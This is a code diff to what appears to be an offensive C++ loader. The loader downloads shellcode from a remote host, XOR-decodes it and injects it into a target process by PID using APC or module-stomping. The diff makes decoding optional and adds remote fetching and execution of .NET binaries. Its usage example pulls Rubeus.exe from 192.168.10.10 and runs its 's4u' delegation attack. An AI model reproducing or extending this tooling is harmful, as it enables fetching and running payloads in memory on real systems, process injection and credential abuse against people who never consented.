@@ -84,8 +84,11 @@ helper helperHandler;
 		std::cout << "-------In fetchRemoteShellcodeAndDecode function-------\n";
 		std::wcout << "downloading shellcode from url: " << std::wstring(url) << " and file: " << std::wstring(file) << "\n";
         std::vector<unsigned char> rep = DownloadBinary(url, file);
-		std::cout << "decoding shellcode with key : " << shellcode_key << "\n";
-        helper::xor_shellcode(rep.data(), (int)rep.size(), shellcode_key);
+        if (shellcode_key != 0x00) {
+            std::cout << "decoding shellcode with key : " << shellcode_key << "\n";
+            helper::xor_shellcode(rep.data(), (int)rep.size(), shellcode_key);
+        }
+		
 		std::cout << "-------Exiting fetchRemoteShellcodeAndDecode function-------\n";
         return rep;
     }
@@ -96,14 +99,19 @@ helper helperHandler;
             "Options for dotnet:\n"
             "  --filePath          File Path on disk \n"
             "  --args              args to pass to the file path on disk\n"
+            "For remote fetching:\n"
+            "  --remote            Remote host (google.com)\n"
+            "  --file              Remote file (/payload.bin)\n"
+			"  --args                args to pass to the file remotely\n"
             "A example for dotnet execution:\n\n"
             ".\\main.exe dotnet --filePath C:\\Users\\ADMIN\\Debug\\test.exe --args test\n"
+            ".\\main.exe dotnet --remote 192.168.10.10  --file /Rubeus.exe --args s4u\n"
             "\n"
 
             "Options for shellcode:\n"
             "  --pid <int>            Target process id\n"
             "  --method <string>      apc | stomp\n"
-            "  --key <hex>            XOR key (default 0x67)\n"
+            "  --key <hex>            XOR key (default 0x67), use 0x00 if the payload isnt xored\n"
             "  --remote <url>         Remote host (google.com)\n"
             "  --file <path>          Remote file (/payload.bin)\n"
             "  --help                 Show this help\n"
